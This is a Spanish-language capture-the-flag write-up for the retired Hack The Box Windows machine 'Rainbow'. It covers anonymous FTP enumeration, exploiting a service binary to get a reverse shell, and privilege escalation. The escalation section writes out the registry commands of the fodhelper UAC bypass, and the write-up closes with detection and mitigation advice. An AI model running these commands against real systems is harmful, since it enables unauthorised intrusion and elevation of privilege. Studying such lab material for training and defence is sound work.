---
machine: Rainbow
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows
state: Retired
pwned: false
tags: [windows, ftp, uac-bypass, fodhelper, reversing]
---

# Rainbow — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin credenciales ni flags reales.

## Resumen

Servidor Windows independiente con FTP anónimo, IIS y una aplicación en el 8080. El FTP expone `rainbow.exe`, `restart.ps1` y una nota de desarrollo: el servicio se reinicia solo cuando el puerto por defecto deja de responder. Se analiza el binario, se explota el servicio para obtener una shell como `rainbow` y se salta el UAC con el bypass de `fodhelper` para llegar a administrador.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -p 21,80,135,139,445,3389,8080 -sCV <IP>
ftp anonymous@<IP>
```

```text
ftp> binary
ftp> mget *
```

`dev.txt` explica que el servicio reinicia `rainbow.exe` y que el puerto se mueve entre 8080 y 8090. `index.html` es la página del 8080. `rainbow.exe` es un PE32; se abre en Ghidra y se identifica el protocolo del servicio.

## Acceso inicial

El binario escucha en el 8080 y procesa la entrada sin validación suficiente. Se reproduce el fallo en local y se lanza el exploit contra el servicio:

```bash
python3 exploit.py <IP> 8080
nc -lnvp 443
```

La shell corre como `rainbow`, un usuario de escritorio con UAC habilitado. Se comprueba:

```powershell
whoami /groups
whoami /priv
```

## Escalada

El usuario está en el grupo Administradores, pero el proceso no está elevado. Se usa el bypass de `fodhelper`, que abusa del handler `ms-settings`:

```powershell
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "C:\Users\rainbow\rev.exe" /f
fodhelper.exe
```

`fodhelper.exe` se ejecuta con auto-elevación y lanza el binario indicado. La nueva conexión llega como administrador.

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lecciones

- Un FTP anónimo puede filtrar el binario y la lógica de reinicio del servicio.
- Los scripts de “reinicio automático” convierten un crash en ejecución controlada.
- Pertenecer a Administradores no equivale a tener un token elevado.
- `fodhelper` sigue siendo un bypass de UAC útil en Windows sin parchear.

## Detección y mitigación

- Deshabilitar FTP anónimo y retirar binarios de directorios públicos.
- Alertar de escrituras en `HKCU\Software\Classes\ms-settings\Shell\Open\command`.
- Monitorizar la ejecución de `fodhelper.exe` desde procesos no interactivos.
- Aplicar `UAC: Run all administrators in Admin Approval Mode` y parches acumulativos.

## Referencias

- <https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html>
- <https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works>
- <https://attack.mitre.org/techniques/T1548/002/>
